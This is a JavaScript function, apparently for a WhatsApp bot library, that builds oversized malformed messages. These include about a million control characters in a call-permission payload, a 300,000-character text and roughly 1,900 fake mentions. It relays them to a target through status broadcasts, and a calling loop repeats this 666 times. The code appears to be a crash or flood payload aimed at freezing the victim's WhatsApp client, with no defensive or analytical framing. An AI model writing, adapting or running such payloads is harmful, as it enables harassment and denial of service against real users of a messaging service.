async function inRespXtend(sock, target, mention = true) {
  try {
    let msg1 = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "‼️⃟가이𝑺𝒏𝒊𝒕𝒉𝐸𝑥𝟹𝑐.", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1045000),
                version: 3,
              },
              entryPointConversionSource: "galaxy_message",
            },
          },
        },
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "999999"),
      }
    );

    let secondMsgContent = {
      extendedTextMessage: {
        text: "ꦾ".repeat(300000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
          ],
        },
      },
    };

    const msg2 = generateWAMessageFromContent(target, secondMsgContent, {});

    for (const msg of [msg1, msg2]) {
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      });

      await sleep(500);

      if (mention) {
        await sock.relayMessage(
          target,
          {
            statusMentionMessage: {
              message: {
                protocolMessage: { key: msg.key.id, type: 25 },
              },
            },
          },
          {}
        );
      }
    }
  } catch (error) {
    console.error("Error di:", error, "Bodooo");
  }
}

// <<( The Calling Function )>>
for (let r = 0; r < 666; r++) {
await inRespXtend(sock, target, false)
}